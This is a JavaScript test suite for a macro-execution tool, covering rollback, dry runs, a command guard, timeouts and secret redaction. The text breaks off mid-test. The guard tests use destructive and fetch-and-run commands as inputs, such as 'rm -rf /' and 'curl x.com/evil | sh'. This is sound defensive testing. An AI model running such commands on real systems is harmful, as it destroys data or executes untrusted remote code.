/**
 * Test suite for Macro Runner v0.1.3
 * Run with: node test.js
 * Cross-platform — uses `node -e` for shell commands instead of platform-specific ones.
 */

import { runMacro, generateRunId, getStats, logBenchmark } from './lib/executor.js';
import { formatMacroResult } from './lib/summarizer.js';
import { createRollbackManager } from './lib/rollback.js';
import { checkCommand } from './lib/guard.js';
import { sanitize, sanitizeShellResult, sanitizeForLogging } from './lib/sanitizer.js';
import { validateMacro } from './lib/validator.js';
import { loadAllTemplates, findTemplate, resolveTemplate } from './lib/templates.js';
import { writeFileSync, readFileSync, unlinkSync, existsSync, mkdirSync, rmdirSync } from 'fs';
import { resolve, dirname } from 'path';

let passed = 0, failed = 0;
function test(name, fn) {
  try { fn(); console.log(`  \x1b[32m✓\x1b[0m ${name}`); passed++; }
  catch (err) { console.log(`  \x1b[31m✗\x1b[0m ${name}: ${err.message}`); failed++; }
}
function assert(cond, msg) { if (!cond) throw new Error(msg || 'Assertion failed'); }

// Cross-platform shell helpers
const ECHO = 'echo hello';
// Node path for this test environment (forward slashes avoid escape issues)
const NODE_BIN = existsSync('C:/Program Files/qclaw/resources/node/node.exe')
  ? 'C:/Program Files/qclaw/resources/node/node.exe'
  : 'node';
const PRINT_CWD = `"${NODE_BIN}" -e "console.log(process.cwd())"`;
const FAIL_CMD = `"${NODE_BIN}" -e "process.exit(1)"`;
const SLOW_CMD = `"${NODE_BIN}" -e "setTimeout(function(){process.exit(0)},5000)"`;
const BUILD_OK = `"${NODE_BIN}" -e "process.stdout.write(Buffer.from([66,85,73,76,68,95,79,75]).toString())"`;
const NOT_FOUND_CMD = `"${NODE_BIN}" -e "process.stdout.write(Buffer.from([78,79,84,95,70,79,85,78,68]).toString())"`;

// ================================================================
// 1. Core execution
// ================================================================
console.log('\n📦 1. Core');
const r1 = runMacro([
  { type: 'shell', description: 'Echo', command: ECHO },
  { type: 'shell', description: 'CWD', command: PRINT_CWD },
]);
test('completed', () => assert(r1.status === 'completed'));
test('2 passed', () => assert(r1.passed_steps === 2));
test('run_id', () => assert(/^mr_\d{8}_[a-z0-9]{6}$/.test(r1.run_id)));

// ================================================================
// 2. Validation
// ================================================================
console.log('\n📦 2. Validation');
test('rejects empty', () => assert(runMacro([]).status === 'validation_failed'));
test('rejects no type', () => assert(!validateMacro([{ type: 'edit' }]).valid));
test('rejects unknown type', () => assert(!validateMacro([{ type: 'bogus' }]).valid));
test('rejects non-array then', () => assert(!validateMacro([{ type: 'conditional', condition: 'x', then: 'str' }]).valid));
test('accepts valid', () => assert(validateMacro([{ type: 'shell', command: 'echo hi' }]).valid));
test('nesting limit', () => {
  const deep = [{ type: 'conditional', condition: 'true', then: [
    { type: 'conditional', condition: 'true', then: [
      { type: 'conditional', condition: 'true', then: [
        { type: 'conditional', condition: 'true', then: [
          { type: 'conditional', condition: 'true', then: [
            { type: 'conditional', condition: 'true', then: [{ type: 'shell', command: 'x' }] }
          ]}
        ]}
      ]}
    ]}
  ]}];
  assert(!validateMacro(deep).valid);
});

// ================================================================
// 3. Template e2e (P0 fix 1)
// ================================================================
console.log('\n📦 3. Template end-to-end');
const tpl = findTemplate('fix-build-test');
test('template exists', () => assert(tpl !== null));
test('has 3 steps', () => assert((tpl.steps || []).length === 3));

const resolved = resolveTemplate(tpl, { file_path: 'src/test.ts', old_code: 'a', new_code: 'b' });
test('resolved ok', () => assert(!resolved.error, resolved.error));
test('param substitution', () => assert(resolved.steps[0].path === 'src/test.ts'));

// Template timeout_ms must be NUMBER not string (P0 fix — type preservation)
const tpl2 = findTemplate('fix-build-test');
const resolved2 = resolveTemplate(tpl2, { file_path: 'x.ts', old_code: 'a', new_code: 'b', build_timeout: 60000, test_timeout: 30000 });
test('build_timeout is number', () => {
  const buildStep = resolved2.steps[1];
  assert(typeof buildStep.timeout_ms === 'number' && buildStep.timeout_ms === 60000,
    `Expected number 60000, got ${typeof buildStep.timeout_ms} ${buildStep.timeout_ms}`);
});

// Full execution via runMacro (e2e!)
const e2eSteps = resolved.steps.map(s => ({ ...s, description: s.description || 'tpl step' }));
// Create the target file and directory so edit can succeed
const e2eTarget = e2eSteps[0].path || e2eSteps[0].file;
if (e2eTarget) {
  try { mkdirSync(dirname(resolve(e2eTarget)), { recursive: true }); } catch (_) {}
  writeFileSync(e2eTarget, e2eSteps[0].old_str || 'old', 'utf8');
}
// Replace build/test commands with cross-platform ones
e2eSteps[1] = { type: 'shell', command: ECHO, description: 'Build (mock)' };
e2eSteps[2] = { type: 'shell', command: ECHO, description: 'Test (mock)' };
const e2e = runMacro(e2eSteps, { rollback_on_error: true });
test('template e2e executes', () => assert(e2e.status === 'completed', `Got ${e2e.status}: ${JSON.stringify(e2e.steps?.map(s => s.error))}`));
// Cleanup
if (e2eTarget && existsSync(e2eTarget)) {
  unlinkSync(e2eTarget);
  try { rmdirSync(dirname(resolve(e2eTarget))); } catch (_) {}
}

// Missing required params
test('missing params error', () => assert(!!resolveTemplate(tpl, {}).error));

// ================================================================
// 4. Rollback
// ================================================================
console.log('\n📦 4. Rollback');
const rbDir = './_test_rb2';
try { rmdirSync(rbDir, { recursive: true }); } catch (_) {}
mkdirSync(rbDir, { recursive: true });
const fa = rbDir + '/a.txt';
const fb = rbDir + '/b.txt';
writeFileSync(fa, 'original A', 'utf8');
writeFileSync(fb, 'original B', 'utf8');

// Success → no rollback
const rOk = runMacro([
  { type: 'edit', path: fa, old_str: 'original A', new_str: 'modified', description: 'Edit' },
  { type: 'shell', command: ECHO, description: 'Ok' },
], { rollback_on_error: true });
test('success no rollback', () => { assert(rOk.status === 'completed'); assert(!rOk.rolled_back); });

// Restore
writeFileSync(fa, 'original A', 'utf8');

// Failure → rollback
const rFail = runMacro([
  { type: 'edit', path: fa, old_str: 'original A', new_str: 'modified', description: 'Edit A' },
  { type: 'edit', path: fb, old_str: 'original B', new_str: 'modified', description: 'Edit B' },
  { type: 'shell', command: FAIL_CMD, description: 'Fail' },
], { rollback_on_error: true });
test('rolled_back status', () => assert(rFail.status === 'rolled_back'));
test('fileA restored', () => assert(readFileSync(fa, 'utf8') === 'original A'));
test('fileB restored', () => assert(readFileSync(fb, 'utf8') === 'original B'));

// New file → rollback deletes
const nf = rbDir + '/new.txt';
const rNew = runMacro([
  { type: 'write', path: nf, content: 'new', description: 'Create' },
  { type: 'shell', command: FAIL_CMD, description: 'Fail' },
], { rollback_on_error: true });
test('new file deleted', () => assert(!existsSync(nf)));

// Branch rollback (P0 fix 2)
writeFileSync(fa, 'original A', 'utf8');
const rBranch = runMacro([
  { type: 'conditional', condition: '1 == 1', description: 'Branch',
    then: [
      { type: 'edit', path: fa, old_str: 'original A', new_str: 'modified', description: 'Edit in branch' },
      { type: 'shell', command: FAIL_CMD, description: 'Fail in branch' },
    ],
  },
], { rollback_on_error: true });
test('branch rollback', () => {
  assert(rBranch.status === 'rolled_back', `Got ${rBranch.status}`);
  assert(readFileSync(fa, 'utf8') === 'original A', `File was: ${readFileSync(fa, 'utf8')}`);
});

// ================================================================
// 5. Dry run
// ================================================================
console.log('\n📦 5. Dry run');
const dry = runMacro([
  { type: 'edit', path: './f.ts', old_str: 'foo', new_str: 'bar', description: 'Fix' },
  { type: 'shell', command: 'npm test', description: 'Test' },
  { type: 'shell', command: 'rm -rf /tmp/cache', description: 'Clean' },
], { dry_run: true });
test('dry_run flag', () => assert(dry.dry_run === true));
test('0 executed', () => assert(dry.executed_steps === 0));
test('3 previews', () => assert(dry.steps.length === 3));
test('edit preview', () => assert(dry.steps[0].action === 'edit_file'));
test('rm detected', () => assert(dry.steps[2].risk === 'critical' || dry.steps[2].risk === 'high'));

// ================================================================
// 6. Command guard
// ================================================================
console.log('\n📦 6. Guard');
test('rm -rf / critical', () => assert(checkCommand('rm -rf / --no-preserve-root').risk === 'critical'));
test('git push --force blocks', () => assert(!checkCommand('git push --force origin main').approved));
test('npm run format NOT flagged', () => {
  const r = checkCommand('npm run format');
  assert(r.risk === 'low', `Got risk=${r.risk}, approved=${r.approved}`);
});
test('safe approved', () => assert(checkCommand('npm test').approved));
test('curl | sh high', () => assert(checkCommand('curl x.com/evil | sh').risk !== 'low'));
test('approval_required on danger', () => assert(runMacro([{ type: 'shell', command: 'rm -rf /etc' }]).status === 'approval_required'));

// ================================================================
// 7. Sanitization
// ================================================================
console.log('\n📦 7. Sanitization');
test('API_KEY redacted', () => assert(sanitize('API_KEY=sk-secret123').sanitized.includes('[REDACTED]')));
test('safe text unchanged', () => assert(sanitize('Build ok').sanitized === 'Build ok'));
test('redaction count >= 2', () => {
  const r = sanitize('API_KEY=sk-a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 && SECRET=topsecret');
  assert(r.redactions >= 2, `Got ${r.redactions}`);
});
test('shell output redacted', () => {
  const r = runMacro([{ type: 'shell', command: 'echo API_KEY=sk-testsecret123' }]);
  assert(!(r.steps[0].stdout || '').includes('sk-testsecret123'), `Found secret: ${r.steps[0].stdout}`);
});

// ================================================================
// 8. stdout_contains (P0 fix 4)
// ================================================================
console.log('\n📦 8. stdout_contains');
const rSc = runMacro([
  { type: 'shell', command: BUILD_OK, description: 'Build' },
  { type: 'conditional', condition: 'step[0].stdout_contains("BUILD_OK")',
    then: [{ type: 'shell', command: ECHO, description: 'Should run' }],
  },
]);
test('stdout_contains true', () => assert(rSc.steps[1].condition_met === true));
test('branch ran', () => assert(rSc.steps[1].branches_executed === 1));

const rSc2 = runMacro([
  { type: 'shell', command: NOT_FOUND_CMD, description: 'Build' },
  { type: 'conditional', condition: 'step[0].stdout_contains("BUILD_OK")',
    else: [{ type: 'shell', command: ECHO, description: 'Should run' }],
  },
]);
test('stdout_contains false', () => assert(rSc2.steps[1].condition_met === false));

// ================================================================
// 9. Status semantics
// ================================================================
console.log('\n📦 9. Statuses');
test('completed', () => assert(runMacro([{ type: 'shell', command: ECHO }]).status === 'completed'));
test('failed_early', () => assert(runMacro([{ type: 'shell', command: FAIL_CMD }]).status === 'failed_early'));
test('completed_with_failures', () =>
  assert(runMacro([{ type: 'shell', command: FAIL_CMD }, { type: 'shell', command: ECHO }], { stop_on_error: false }).status === 'completed_with_failures'));
// timed_out: use a command that sleeps longer than the macro timeout
const SLEEP_CMD = process.platform === 'win32' ? SLOW_CMD : 'sleep 10';
test('timed_out', () => assert(runMacro([{ type: 'shell', command: SLEEP_CMD }], { timeout_ms: 500 }).status === 'timed_out'));
test('validation_failed', () => assert(runMacro([]).status === 'validation_failed'));
test('approval_required', () => assert(runMacro([{ type: 'shell', command: 'rm -rf /' }]).status === 'approval_required'));

// ================================================================
// 10. Benchmark sanitization (P0 fix — no more || true)
// ================================================================
console.log('\n📦 10. Benchmark logging safety');
const safe = sanitizeForLogging('echo $SECRET', { SECRET: 'mysecret', PUBLIC: 'hello' });
test('env_keys is array', () => assert(Array.isArray(safe.env_keys)));
test('SECRET key preserved in keys list', () => assert(safe.env_keys.includes('SECRET')));
test('env values NOT in command', () => {
  const cmdStr = JSON.stringify(safe);
  assert(!cmdStr.includes('mysecret'), `Found secret in: ${cmdStr}`);
});

// ================================================================
// 11. Branch result formatting
// ================================================================
console.log('\n📦 11. Branch errors propagated');
const rBr = runMacro([
  { type: 'conditional', condition: '1 == 1', description: 'Branch fail',
    then: [
      { type: 'shell', command: FAIL_CMD, description: 'Should fail' },
    ],
  },
], { stop_on_error: false });
test('conditional has error', () => assert(rBr.steps[0].error && rBr.steps[0].error.length > 0));
test('branch_results present', () => assert(rBr.steps[0].branch_results && rBr.steps[0].branch_results.length === 1));

// ================================================================
// 12. Branch timeout (P0 fix 2)
// ================================================================
console.log('\n📦 12. Branch timeout');
const rBto = runMacro([
  { type: 'conditional', condition: '1 == 1', description: 'Slow branch',
    then: [
      { type: 'shell', command: SLOW_CMD, description: 'Slow', timeout_ms: 100 },
    ],
  },
], { timeout_ms: 2000 });
test('branch timeout enforced', () => assert(rBto.status === 'failed_early' || rBto.status === 'timed_out'));

// ================================================================
// v0.1.3: Recursive step counting
// ================================================================
console.log('\n📦 13. Recursive step counts');
const rCount = runMacro([
  { type: 'conditional', condition: '1 == 1', description: 'Branch',
    then: [
      { type: 'shell', command: ECHO, description: 'A' },
      { type: 'shell', command: ECHO, description: 'B' },
      { type: 'shell', command: ECHO, description: 'C' },
    ],
  },
]);
test('leaf_steps_executed >= 3', () => assert(rCount.leaf_steps_executed >= 3, `Got ${rCount.leaf_steps_executed}`));
test('top_level_steps = 1', () => assert(rCount.top_level_steps === 1));
test('leaf > top', () => assert(rCount.leaf_steps_executed > rCount.executed_steps));

// ================================================================
// v0.1.3: Branch timeout exact status
// ================================================================
console.log('\n📦 14. Branch timeout exact status');
const rBto2 = runMacro([
  { type: 'conditional', condition: '1 == 1', description: 'Slow branch',
    then: [
      { type: 'shell', command: SLOW_CMD, description: 'Slow', timeout_ms: 100 },
    ],
  },
], { timeout_ms: 2000 });
test('branch timeout → timed_out (exact)', () => assert(rBto2.status === 'timed_out', `Expected timed_out, got ${rBto2.status}`));

// ================================================================
// v0.1.3: schema_version validation
// ================================================================
console.log('\n📦 15. schema_version');
test('schema_version 999 rejected', () => {
  const r = runMacro([{ type: 'shell', command: ECHO }], { schema_version: '999' });
  assert(r.status === 'validation_failed', `Got ${r.status}`);
});
test('schema_version 1 accepted', () => {
  const r = runMacro([{ type: 'shell', command: ECHO }], { schema_version: '1' });
  assert(r.status === 'completed');
});

// ================================================================
// v0.1.3: Recursive sanitization
// ================================================================
console.log('\n📦 16. Recursive sanitization');
import { sanitizeObject } from './lib/sanitizer.js';
test('sanitizeObject recurses', () => {
  const obj = { command: 'echo API_KEY=sk-secret', nested: { value: 'TOKEN=abc123' } };
  const clean = sanitizeObject(obj);
  assert(!JSON.stringify(clean).includes('sk-secret'));
  assert(!JSON.stringify(clean).includes('abc123'));
});

// ================================================================
// v0.1.3: Dry run recursive preview
// ================================================================
console.log('\n📦 17. Dry run branch preview');
const dryBranch = runMacro([
  { type: 'conditional', condition: '1 == 1', description: 'Branch',
    then: [
      { type: 'shell', command: 'npm test', description: 'Test in branch' },
    ],
  },
], { dry_run: true });
const condPreview = dryBranch.steps[0];
test('dry_run: then_preview exists', () => assert(Array.isArray(condPreview.then_preview) && condPreview.then_preview.length >= 1));
test('dry_run: sub-step has action', () => assert(condPreview.then_preview[0].action === 'shell'));

// ================================================================
// v0.1.3: execution_status + rollback_status
// ================================================================
console.log('\n📦 18. execution/rollback status');
const rExec = runMacro([{ type: 'shell', command: ECHO }]);
test('execution_status on success', () => assert(rExec.execution_status === 'completed'));
test('rollback_status none', () => assert(rExec.rollback_status === 'none'));

const rRollFail = runMacro([
  { type: 'edit', path: fa, old_str: 'original A', new_str: 'modified', description: 'Edit' },
  { type: 'shell', command: FAIL_CMD, description: 'Fail' },
], { rollback_on_error: true });
test('execution_status failed_early', () => assert(rRollFail.execution_status === 'failed_early'));
test('rollback_status rolled_back', () => assert(rRollFail.rollback_status === 'rolled_back'));
test('combined status rolled_back', () => assert(rRollFail.status === 'rolled_back'));

// ================================================================
// v0.1.4: Exception → rollback guarantee
// ================================================================
console.log('\n📦 19. Exception → rollback (v0.1.4 P0-1)');
// Write to a non-existent directory throws ENOENT — must be caught
// and the prior edit must still be rolled back
const excDir = rbDir + '/nonexistent';
const excFile = excDir + '/file.txt';
try { rmdirSync(excDir, { recursive: true }); } catch (_) {}
// Ensure parent dir does NOT exist
if (existsSync(excDir)) { rmdirSync(excDir, { recursive: true }); }

writeFileSync(fa, 'original A', 'utf8');
const rExc = runMacro([
  { type: 'edit', path: fa, old_str: 'original A', new_str: 'modified', description: 'Edit before crash' },
  { type: 'write', path: excFile, content: 'should fail', description: 'Write to missing dir' },
  { type: 'shell', command: ECHO, description: 'Never runs' },
], { rollback_on_error: true });
test('exception caught (not crash)', () => {
  assert(rExc.status === 'rolled_back' || rExc.status === 'failed_early',
    `Expected rolled_back or failed_early, got ${rExc.status}`);
});
test('exception step has error', () => {
  const writeStep = rExc.steps.find(s => s.type === 'write');
  assert(writeStep && writeStep.ok === false, `Write step should fail, got ok=${writeStep?.ok}`);
});
test('edit was rolled back after exception', () => {
  assert(readFileSync(fa, 'utf8') === 'original A',
    `File should be "original A" but was: "${readFileSync(fa, 'utf8')}"`);
});

// ================================================================
// v0.1.4: Nested step index isolation
// ================================================================
console.log('\n📦 20. Nested step index isolation (v0.1.4 P0-2)');
const rNested = runMacro([
  { type: 'shell', command: ECHO, description: 'Step 0' },
  { type: 'conditional', condition: '1 == 1', description: 'Step 1 conditional',
    then: [
      { type: 'shell', command: ECHO, description: 'Branch step A' },
      { type: 'shell', command: ECHO, description: 'Branch step B' },
    ],
  },
  { type: 'shell', command: ECHO, description: 'Step 2 top-level' },
]);
test('step[2] is top-level (not overwritten by branch)', () => {
  assert(rNested.steps[2].type === 'shell',
    `Expected shell at step[2], got ${rNested.steps[2]?.type}`);
  assert(rNested.steps[2].description === 'Step 2 top-level',
    `Expected "Step 2 top-level", got "${rNested.steps[2]?.description}"`);
});
test('conditional has branch_results', () => {
  assert(rNested.steps[1].type === 'conditional');
  assert(Array.isArray(rNested.steps[1].branch_results));
  assert(rNested.steps[1].branch_results.length === 2,
    `Expected 2 branch results, got ${rNested.steps[1].branch_results?.length}`);
});

// ================================================================
// v0.1.4: Condition strictness
// ================================================================
console.log('\n📦 21. Condition strictness (v0.1.4 P1)');
// Typo in expression name: "exut_code" instead of "exit_code"
const rBadCond = runMacro([
  { type: 'conditional', condition: 'step[0].exut_code == 0', description: 'Typo condition',
    then: [{ type: 'shell', command: ECHO, description: 'Should NOT run' }],
  },
]);
test('bad condition fails explicitly', () => {
  assert(!rBadCond.steps[0].ok, 'Conditional with typo should fail');
  assert(rBadCond.steps[0].error && rBadCond.steps[0].error.includes('Unresolved'),
    `Error should say "Unresolved", got: ${rBadCond.steps[0]?.error}`);
});

// ================================================================
// v0.1.4: Variable name validation
// ================================================================
console.log('\n📦 22. Variable name validation (v0.1.4 P1)');
test('bad assign_to rejected (brackets)', () => {
  const v = validateMacro([{ type: 'read', path: 'test.js', assign_to: 'foo[0]' }]);
  assert(!v.valid, `Should reject, errors: ${JSON.stringify(v.errors)}`);
});
test('bad assign_to rejected (special chars)', () => {
  const v = validateMacro([{ type: 'read', path: 'test.js', assign_to: 'a.*' }]);
  assert(!v.valid, `Should reject regex chars, errors: ${JSON.stringify(v.errors)}`);
});
test('good assign_to accepted', () => {
  const v = validateMacro([{ type: 'read', path: 'test.js', assign_to: 'my_var_1' }]);
  assert(v.valid, `Should accept valid name, errors: ${JSON.stringify(v.errors)}`);
});
test('reserved word assign_to rejected', () => {
  const v = validateMacro([{ type: 'read', path: 'test.js', assign_to: 'step' }]);
  assert(!v.valid, `Should reject "step" as reserved, errors: ${JSON.stringify(v.errors)}`);
});

// ================================================================
// v0.1.4: Step ID
// ================================================================
console.log('\n📦 23. Step ID validation (v0.1.4 P1)');
test('duplicate step IDs rejected', () => {
  const v = validateMacro([
    { type: 'shell', command: 'a', id: 'build' },
    { type: 'shell', command: 'b', id: 'build' },
  ]);
  assert(!v.valid, `Should reject duplicate IDs, got valid=${v.valid}`);
});
test('invalid ID chars rejected', () => {
  const v = validateMacro([{ type: 'shell', command: 'a', id: 'my step' }]);
  assert(!v.valid, `Should reject space in ID, got valid=${v.valid}`);
});
test('valid step IDs accepted', () => {
  const v = validateMacro([
    { type: 'shell', command: 'a', id: 'build' },
    { type: 'shell', command: 'b', id: 'test_step' },
  ]);
  assert(v.valid, `Should accept valid IDs, errors: ${JSON.stringify(v.errors)}`);
});

// ================================================================
// v0.1.4: steps.ID.property references
// ================================================================
console.log('\n📦 24. steps.ID.property references (v0.1.4)');
const rIdRef = runMacro([
  { type: 'shell', command: ECHO, id: 'hello', description: 'Echo' },
  { type: 'conditional',
    condition: 'steps.hello.status == "success"',
    description: 'Check by ID',
    then: [{ type: 'shell', command: ECHO, description: 'Runs on success' }],
  },
]);
test('steps.ID ref works', () => {
  assert(rIdRef.status === 'completed', `Got ${rIdRef.status}`);
  assert(rIdRef.steps[1].condition_met === true,
    `Expected condition_met=true, got ${rIdRef.steps[1]?.condition_met}`);
});

// ================================================================
// v0.1.4: stop_on_error in branches
// ================================================================
console.log('\n📦 25. stop_on_error in branches (v0.1.4 P1)');
const rBranchStopFalse = runMacro([
  { type: 'conditional', condition: '1 == 1', description: 'Branch continue',
    then: [
      { type: 'shell', command: FAIL_CMD, description: 'Fails first' },
      { type: 'shell', command: ECHO, description: 'Runs second' },
    ],
  },
], { stop_on_error: false });
test('branch continues after failure', () => {
  assert(rBranchStopFalse.steps[0].branch_results.length === 2,
    `Expected 2 branch results, got ${rBranchStopFalse.steps[0].branch_results?.length}`);
});
test('first branch step failed', () => {
  assert(rBranchStopFalse.steps[0].branch_results[0].ok === false);
});
test('second branch step ran', () => {
  assert(rBranchStopFalse.steps[0].branch_results[1].ok === true,
    `Second branch step ok=${rBranchStopFalse.steps[0].branch_results[1]?.ok}`);
});

// ================================================================
// v0.1.4: stop_on_error: true in branches (default — stops early)
// ================================================================
console.log('\n📦 26. stop_on_error: true in branches (v0.1.4)');
const rBranchStopTrue = runMacro([
  { type: 'conditional', condition: '1 == 1', description: 'Branch stop',
    then: [
      { type: 'shell', command: FAIL_CMD, description: 'Fails first' },
      { type: 'shell', command: ECHO, description: 'NEVER runs' },
    ],
  },
], { stop_on_error: true });
test('branch stops on first failure', () => {
  assert(rBranchStopTrue.steps[0].branch_results.length === 1,
    `Expected 1 branch result (stopped early), got ${rBranchStopTrue.steps[0].branch_results?.length}`);
});

// ================================================================
// v0.1.5: Benchmark does not crash on early returns
// ================================================================
console.log('\n📦 27. Benchmark on early returns (v0.1.5 P0)');
// Enable benchmark for these tests
const prevBenchmark = process.env.MACRO_TOKEN_BENCHMARK_ENABLED;
process.env.MACRO_TOKEN_BENCHMARK_ENABLED = 'true';

test('benchmark + dry_run no crash', () => {
  const r = runMacro([{ type: 'shell', command: ECHO }], { dry_run: true });
  assert(r.status === 'completed', `Got ${r.status}`);
});
test('benchmark + validation_failed no crash', () => {
  const r = runMacro([]);
  assert(r.status === 'validation_failed', `Got ${r.status}`);
});
test('benchmark + approval_required no crash', () => {
  const r = runMacro([{ type: 'shell', command: 'rm -rf /' }]);
  assert(r.status === 'approval_required', `Got ${r.status}`);
});
test('benchmark + timed_out no crash', () => {
  const r = runMacro([{ type: 'shell', command: SLOW_CMD }], { timeout_ms: 100 });
  assert(r.status === 'timed_out', `Got ${r.status}`);
});

// Restore benchmark setting
if (prevBenchmark === undefined) {
  delete process.env.MACRO_TOKEN_BENCHMARK_ENABLED;
} else {
  process.env.MACRO_TOKEN_BENCHMARK_ENABLED = prevBenchmark;
}

// ================================================================
// v0.1.5: Branch step ID registration
// ================================================================
console.log('\n📦 28. Branch step ID registration (v0.1.5 P0)');
const rBranchId = runMacro([
  { type: 'conditional', condition: 'true', description: 'Build branch',
    then: [
      { id: 'build_step', type: 'shell', command: ECHO, description: 'Build in branch' },
    ],
  },
  { type: 'assert', condition: 'steps.build_step.status == "success"', description: 'Verify build' },
]);
test('branch step ID accessible after branch', () => {
  assert(rBranchId.status === 'completed', `Got ${rBranchId.status}: ${JSON.stringify(rBranchId.steps?.map(s => s.error))}`);
});

// ================================================================
// v0.1.5: Branch timeout propagated in stop_on_error:false
// ================================================================
console.log('\n📦 29. Branch timeout propagation (v0.1.5 P0)');
const rBranchTimeout = runMacro([
  { type: 'conditional', condition: '1 == 1', description: 'Slow branch',
    then: [
      { type: 'shell', command: SLOW_CMD, timeout_ms: 100, description: 'Times out' },
      { type: 'shell', command: ECHO, description: 'Never runs' },
    ],
  },
], { stop_on_error: false });
test('branch timed_out propagated', () => {
  const condResult = rBranchTimeout.steps[0];
  assert(condResult.timed_out === true,
    `Expected timed_out=true on conditional, got ${condResult.timed_out}`);
});

// ================================================================
// v0.1.5: UNRESOLVED sentinel — missing step ID
// ================================================================
console.log('\n📦 30. UNRESOLVED sentinel (v0.1.5 P1)');
const rMissingId = runMacro([
  { type: 'assert', condition: 'steps.nonexistent.status == "success"', description: 'Bad ref' },
]);
test('missing step ID fails explicitly', () => {
  assert(!rMissingId.steps[0].ok, 'Should fail on missing step ID');
});

// ================================================================
// v0.1.5: stdout_contains anchoring
// ================================================================
console.log('\n📦 31. stdout_contains anchoring (v0.1.5 P1)');
test('non-step prefix rejected', () => {
  const r = runMacro([
    { type: 'conditional', condition: 'foo[0].stdout_contains("hello")', description: 'Bad prefix',
      then: [{ type: 'shell', command: ECHO }],
    },
  ]);
  // Should fail because "foo[0]" is not "step[0]"
  assert(!r.steps[0].ok, `Should reject non-step prefix, got ok=${r.steps[0]?.ok}`);
});

// ================================================================
// v0.1.5: Strict number parsing
// ================================================================
console.log('\n📦 32. Strict number parsing (v0.1.5 P1)');
test('"0abc" not a number', () => {
  const r = runMacro([
    { type: 'conditional', condition: '0abc == 0', description: 'Partial number',
      then: [{ type: 'shell', command: ECHO }],
    },
  ]);
  // "0abc" is not a valid number, so string comparison: "0abc" !== "0"
  assert(r.steps[0].condition_met === false,
    `"0abc" should not equal 0, got condition_met=${r.steps[0]?.condition_met}`);
});

// ================================================================
// v0.1.5: Leaf counts: planned vs executed vs skipped
// ================================================================
console.log('\n📦 33. Leaf step counts (v0.1.5 P1)');
const rLeafCounts = runMacro([
  { type: 'shell', command: ECHO, description: 'Step 0' },
  { type: 'conditional', condition: '1 == 1', description: 'Branch',
    then: [
      { type: 'shell', command: ECHO, description: 'Branch A' },
      { type: 'shell', command: ECHO, description: 'Branch B' },
    ],
  },
  { type: 'shell', command: FAIL_CMD, description: 'Step 2 fails' },
  { type: 'shell', command: ECHO, description: 'Never runs' },
]);
test('leaf_steps_declared count', () => {
  // Declared: step0 + branchA + branchB + step2 + step4 = 5 (both branches counted)
  assert(rLeafCounts.leaf_steps_declared >= 4,
    `Expected >=4 declared leaves, got ${rLeafCounts.leaf_steps_declared}`);
});
test('leaf_steps_executed < declared', () => {
  assert(rLeafCounts.leaf_steps_executed < rLeafCounts.leaf_steps_declared,
    `Executed ${rLeafCounts.leaf_steps_executed} should be < declared ${rLeafCounts.leaf_steps_declared}`);
});
test('leaf_steps_not_reached >= 1', () => {
  assert(rLeafCounts.leaf_steps_not_reached >= 1,
    `Expected not_reached >= 1, got ${rLeafCounts.leaf_steps_not_reached}`);
});

// ================================================================
// v0.1.5: macro_status works without benchmark
// ================================================================
console.log('\n📦 34. logBenchmark safe on all result shapes (v0.1.5 P1)');
test('logBenchmark: missing token_savings_estimate', () => {
  // dry_run results have no token_savings_estimate
  logBenchmark({ status: 'completed', run_id: 'test1', total_steps: 3,
    executed_steps: 0, passed_steps: 0, failed_steps: 0, total_duration_ms: 10 });
  // Should not throw — passes if we reach here
  assert(true);
});
test('logBenchmark: null estimate', () => {
  logBenchmark({ status: 'validation_failed', run_id: 'test2', total_steps: 0,
    executed_steps: 0, passed_steps: 0, failed_steps: 0, total_duration_ms: 5,
    token_savings_estimate: null });
  assert(true);
});
test('getStats tracks after logBenchmark', () => {
  const stats = getStats();
  assert(stats.requests_total >= 2,
    `Expected >=2 requests after logBenchmark calls, got ${stats.requests_total}`);
});

// ================================================================
// v0.1.5: trim_output_lines actually used
// ================================================================
console.log('\n📦 35. trim_output_lines connected (v0.1.5 P1)');
const rTrim = runMacro([
  { type: 'shell', command: ECHO, description: 'Trim test', trim_output_lines: 10 },
]);
test('result carries trim_output_lines', () => {
  assert(rTrim.steps[0].trim_output_lines === 10,
    `Expected trim_output_lines=10, got ${rTrim.steps[0]?.trim_output_lines}`);
});

// ================================================================
// v0.1.6: Default timeout is actually enforced
// ================================================================
console.log('\n📦 36. Default timeout enforced (v0.1.6 P0)');
test('default timeout is finite', () => {
  // Without explicit timeout, should default to 300000ms (not null/infinite)
  const r = runMacro([{ type: 'shell', command: SLOW_CMD }]);
  // The macro should NOT timeout since 5s < 300s default
  assert(r.status === 'completed' || r.status === 'timed_out',
    `Got ${r.status}`);
  // Verify total_duration_ms is bounded (not infinite hang)
  assert(r.total_duration_ms < 300000,
    `Total duration ${r.total_duration_ms}ms exceeds default timeout`);
});

test('short timeout still enforced', () => {
  const r = runMacro([{ type: 'shell', command: SLOW_CMD }], { timeout_ms: 100 });
  assert(r.status === 'timed_out', `Expected timed_out, got ${r.status}`);
});

// ================================================================
// v0.1.6: Deadline check prevents side effects after timeout in branches
// ================================================================
console.log('\n📦 37. Deadline prevents side effects in branches (v0.1.6 P0)');
writeFileSync(fa, 'before timeout', 'utf8');
// Timeout in branch sub-step — even with stop_on_error:false, the edit after
// a timeout in the SAME branch must be blocked by the deadline check.
const rDeadline = runMacro([
  { type: 'conditional', condition: '1 == 1', description: 'Branch with timeout',
    then: [
      { type: 'shell', command: SLOW_CMD, timeout_ms: 50, description: 'Times out in branch' },
      { type: 'edit', path: fa, old_str: 'before timeout', new_str: 'after timeout', description: 'Must NOT execute' },
    ],
  },
], { stop_on_error: false, timeout_ms: 2000 });
test('branch: edit NOT executed after timeout', () => {
  const branchResults = rDeadline.steps[0].branch_results;
  assert(branchResults.length === 1,
    `Expected exactly 1 branch result (timed out), got ${branchResults?.length}`);
  assert(branchResults[0].timed_out === true,
    `First branch step should be timed_out`);
});
test('branch: file NOT modified after timeout', () => {
  assert(readFileSync(fa, 'utf8') === 'before timeout',
    `File was modified despite timeout: "${readFileSync(fa, 'utf8')}"`);
});

// ================================================================
// v0.1.6: stdout_contains missing ID → valid:false
// ================================================================
console.log('\n📦 38. stdout_contains strict missing (v0.1.6 P1)');
const rMissingStdout = runMacro([
  { type: 'conditional',
    condition: 'steps.nonexistent.stdout_contains("hello")',
    description: 'Missing ID',
    then: [{ type: 'shell', command: ECHO }],
  },
]);
test('missing ID in stdout_contains fails', () => {
